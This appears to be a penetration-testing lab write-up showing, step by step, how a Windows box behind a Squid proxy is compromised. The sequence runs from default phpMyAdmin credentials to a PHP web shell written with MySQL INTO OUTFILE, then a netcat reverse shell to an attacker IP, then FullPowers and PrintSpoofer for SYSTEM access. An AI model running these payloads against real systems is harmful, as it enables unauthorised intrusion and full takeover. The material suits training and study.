#box

*Created: 1/29/2026*

### Step 1

**Tags:** #Proxy #HTTP-Proxy #Squid

🔗 **URL/Link:** https://angelica.gitbook.io/hacktricks/network-services-pentesting/3128-pentesting-squid

**Command:**
```bash
python3 spose.py --proxy http://192.168.132.189:3128 --target 192.168.132.189

# Scanning default common ports
# Using proxy address http://192.168.132.189:3128
# 192.168.132.189:3306 seems OPEN
# 192.168.132.189:8080 seems OPEN
```

*Port: 3128*

> 
> The machine shows the presence of a http-proxy hosted on port 3128. We discover online, searching for `pentesting squid` the following [webpage](https://angelica.gitbook.io/hacktricks/network-services-pentesting/3128-pentesting-squid) being particularly useful as it suggests us a way to check what is hidden behind SQUID's proxy through either cURL or a python library called [spose.py](https://github.com/aancw/spose). Within spose we discover that port 8080 and port 3306 are available throughout the proxy on port 3128

---

### Step 2

**Tags:** #HTTP-Proxy #Proxy #Squid #Wampserver

**Command:**
```bash
# We configure the proxy throughout Firefox settings because we had issues in doing so with proxychains. To do so we can open the Firefox menu and:
# Settings -> Network Settings -> Manual Proxy Configuration
# From here we insert the HTTP Proxy to be the target IP and the port to be Squid's http-proxy, in that case port 3128.
```

*Port: 8080 | 💎 GEM*

> 
> Once found the way to bypass the proxy, we discover that on port 8080 a service called Wampserver is running. After some enumeration we discover that we can access a `phpmyadmin` instance with the default credentials: `root:` (no password).

---

### Step 3

**Tags:** #MySQL #Web-Shell #Reverse-Shell #MySQL-INTO-OUTFILE #phpinfo

**Command:**
```sql
# To discover the correct path we can check it out on the `phpinfo` located on the Wampserver homepage under the Tools section. Inside the phpinfo we can look for DOCUMENT_ROOT to understand the location where the application is hosted
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/wamp/www/webshell.php';
```

*Port: 3306 | 💎 GEM*

> 
> Authenticated on mysql we proceed to upload a webshell. To discover the path where to upload it we leverage the exposed `phpinfo` file which highlights to us that the webserver is being host in: `C:/wamp/www`. We proceed to upload the webshell at `C:/wamp/www/webshell.php`. Once uploaded, we gain a reverse shell with `Powershell #3 (Base64)` on our port 3128

---

### Step 4

**Tags:** #FullPowers #NT-AUTHORITY\Local-Service #schtasks

**Command:**
```bash
# To proceed with this attack we must download on the target machine both `FullPowers.exe` and `nc.exe` to be able to catch a reverse shell with the 'empowered' shell.

./FullPowers.exe -c "C:\Temp\nc.exe 192.168.45.220 3128 -e cmd" -z
```

*💎 GEM*

> 
> Landed on the machine, we discover that we're `NT AUTHORITY\Local Service`. This particular user has a peculiar privilege escalation path because while our current shell doesn't have all the expected privileges for that user, we can schedule a task that will grant us `SeImpersonatePrivilege` (consenting us to the use PrintSpoofer to escalate). To do so we go throughout this interesting article: [Local Service Privileges](https://itm4n.github.io/localservice-privileges/) and at the end we discover that the user has made an Exploit for it called [FullPowers](https://github.com/itm4n/FullPowers)

---

### Step 5

**Tags:** #PrintSpoofer #SeImpersonatePrivilege

**Command:**
```bash
# Once on the empowered shell, we discover with:
whoami /all
# that we have the SeImpersonatePrivilege. This privilege permits us to use a Potato privilege escalation or PrintSpoofer, depending on the current windows version. We use PrintSpoofer64 in that case, achieving a SYSTEM shell.
./PrintSpoofer64.exe -i -c cmd
```

> 
> Once gained the SeImpersonatePrivilege as `NT AUTHORITY\Local Service` we can successfully gain a `NT AUTHORITY\SYSTEM` shell with  `PrintSpoofer`

---

